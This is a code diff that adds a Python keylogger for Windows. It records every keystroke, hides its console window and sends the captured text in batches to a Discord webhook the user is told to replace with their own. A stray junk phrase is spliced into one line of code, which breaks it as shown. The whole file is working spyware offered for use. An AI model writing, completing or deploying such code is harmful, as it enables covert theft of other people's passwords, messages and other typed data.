@@ -1,0 +1,85 @@
+import time
+import keyboard
+import requests
+import ctypes
+import threading
+
+WEBHOOK_URL = 'https://discord.com/api/webhooks/example'  #CHANGE THE WEBHOOK TO YOURS
+buffer = []
+stop_flag = threading.Event()
+SEND_INTERVAL = 5  
+
+def send_keylogs():
+    global buffer
+    if buffer:
+        word = ''.join(buffer).strip()
+        if word:
+            payload = {
+                'content': word
+            }
+            try:
+                response = requests.post(WEBHOOK_URL, data=payload)
+                response.raise_for_status()  
+                print(f"Sent: {word}")
+            except requests.exceptions.RequestException as e:
+                print(f"Error sending keylogs: {e}")
+            buffer = []keyloggers imkeyloggers in ohio rizzzzz 
+
+def cap(event):
+    global buffer
+    if event.name == 'space':
+        buffer.append(' ')
+        send_keylogs()
+    elif event.name == 'enter':
+        buffer.append('\n')
+        send_keylogs()
+    elif event.name == 'backspace':
+        if buffer:
+            buffer.pop()  
+    elif event.name == 'tab':
+        buffer.append('\t')
+    elif event.name in ['shift', 'ctrl', 'alt', 'win', 'esc', 'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12']:
+        buffer.append(f"[{event.name.upper()}]")
+    elif len(event.name) == 1:  
+        buffer.append(event.name)
+    
+    if len(buffer) >= 100:
+        send_keylogs()
+
+def periodic_sending():
+    while not stop_flag.is_set():
+        time.sleep(SEND_INTERVAL)
+        send_keylogs()
+
+def stop_keylogger():
+    print("Stopping keylogger...")
+    stop_flag.set()
+
+def hide_console():
+    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+
+def main():
+    hide_console()  
+    keyboard.on_release(callback=cap)
+    keyboard.add_hotkey('ctrl+shift+q', stop_keylogger)  
+    print("Keylogger running. Press Ctrl+Shift+Q to stop.")
+
+    threading.Thread(target=periodic_sending, daemon=True).start()
+    
+    try:
+        while not stop_flag.is_set():
+            time.sleep(1)  
+    except KeyboardInterrupt:
+        print("Script terminated by user.")
+    except Exception as e:
+        print(f"An error occurred: {e}")
+    finally:
+        send_keylogs()  
+        print("Exiting script...")
+
+if __name__ == "__main__":
+    main()
+
+#To turn off press CTRL+Shift+Q
+#To turn back on just re run the file
+#SAVE AS .PY!!!
